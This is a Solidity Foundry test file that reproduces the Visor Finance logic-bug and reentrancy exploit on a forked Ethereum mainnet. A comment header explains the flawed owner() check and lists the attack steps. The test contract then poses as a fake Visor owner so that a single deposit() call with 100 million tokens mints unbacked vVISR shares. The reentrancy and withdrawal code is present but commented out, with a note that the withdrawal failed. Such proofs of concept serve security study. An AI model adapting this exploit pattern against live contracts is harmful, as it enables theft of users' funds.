// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./Interface.sol";

/*
Visor Finance Logic Bug cum Rentrancy Exploit PoC

The attacker exploited multiple vulnerabilities in Visor Finance via a malicious contract, and forged a transaction to deposit X million tokens into Visor Finance’s stake mining contract which later on were withdrawn from the stake mining contract using the stake certificates.

The Vulnerbility:

The isContract(from) check wherein "require(IVisor(from).owner() == msg.sender)" triggers the delegatedTransferERC20() call wherin attacker performs reentrancy.

Steps

1. The attacker deploys malicious contract
2. Call the deposit() function of the stake mining contract through the attack contract, and specify the amount of tokens deposited (visrDeposit) to be 100 million. The amount of stake certificates shares is calculated as 97,624,975 vVISR.
3. The attack contract sets the return value IVisor(from).owner() to the msg.sender.
4. The reentrancy is executed in the delegatedTransferERC20() function of the attack contract. and the deposit function of the stake mining contract is called again. the second execution to delegatedTransferERC20() function the attack contract will not perform any operations;
5. The hacker swaps vVISR to VISR through a withdrawal transaction later on for WETH via UniswapV2.

forge test --contracts ./test/5_VisorFinance.sol --match-contract VisorFinanceExploit -vv
*/

contract VisorFinanceExploit is DSTest {
    IRewardsHypervisor irrewards = IRewardsHypervisor(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
    IvVISR visr = IvVISR(0x3a84aD5d16aDBE566BAA6b3DafE39Db3D5E261E5);
    //IERC20 visrToken = IERC20(0xF938424F7210f31dF2Aee3011291b658f872e91e);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    bool public isCalledOnce;

    function setUp() public {
        cheats.createSelectFork("https://rpc.ankr.com/eth", 13849006); //fork mainnet at block 13849006 

        // attacker Withdrawal tx at 13849051
        //0x6eabef1bf310a1361041d97897c192581cd9870f6a39040cd24d7de2335b4546
    }

    function testExploit() public {
        emit log_named_uint("(Before Exploit) Attacker VIST Balance", visr.balanceOf(msg.sender));
        irrewards.deposit(100000000000000000000000000, address(this), msg.sender);
        // VISR_Balance =  visr.balanceOf(msg.sender);
        emit log_named_uint("(After Exploit) Attacker VIST Balance", visr.balanceOf(msg.sender));

        //console.log(address(this)); //0xb4c79dab8f259c7aee6e5b2aa729821864227e84
        //console.log(msg.sender); // 0x00a329c0648769a73afac7f9381e08fb43dbea72

        //irrewards.withdraw did not work as expected not sure the reason for failing.
        //the actual hacker tx also failed.
        //cheats.prank(msg.sender);
        // irrewards.withdraw(
        //     visr.balanceOf(msg.sender),
        //     0x00a329c0648769A73afAc7F9381E08FB43dBEA72,
        //     0x00a329c0648769A73afAc7F9381E08FB43dBEA72
        // );
 
        // Hacker Tx
        // cheats.prank(0x8Efab89b497b887CDaA2FB08ff71e4b3827774B2);
        // irrewards.withdraw(
        //     visr.balanceOf(0x8Efab89b497b887CDaA2FB08ff71e4b3827774B2),
        //     0x8Efab89b497b887CDaA2FB08ff71e4b3827774B2,
        //     0x8Efab89b497b887CDaA2FB08ff71e4b3827774B2
        // );
    }

    function owner() external view returns (address) {
        return (address(this));
    }

    function delegatedTransferERC20(
        address token,
        address to,
        uint256 amount
    ) external {
        //custom logic of rentrancy to call the irrewards.deposit() only once

        // if(isCalledOnce == false){
        //     irrewards.deposit(100000000000000000000000000, address(this), msg.sender);
        //     isCalledOnce = true;
        // }
    }

}